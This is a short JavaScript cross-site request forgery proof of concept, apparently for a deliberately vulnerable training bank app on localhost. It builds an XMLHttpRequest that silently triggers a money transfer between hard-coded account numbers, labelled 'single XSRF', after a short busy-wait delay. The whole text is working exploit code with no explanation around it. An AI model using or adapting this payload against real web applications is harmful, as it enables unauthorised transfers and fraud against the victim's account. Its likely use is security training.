var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    console.log(this.responseText);
}
xhttp.open("GET", "http://127.0.0.1/vBank/htdocs/index.php?page=htbtransfer"+
"&srcacc=184830489&dstbank=41131337&dstacc=44444444&amount=1&remark=single XSRF"+
"&htbtransfer=Transfer", true);
var start = new Date().getTime();
var end = start;
while(end < start + 500) {
    end = new Date().getTime();
  }
xhttp.send();
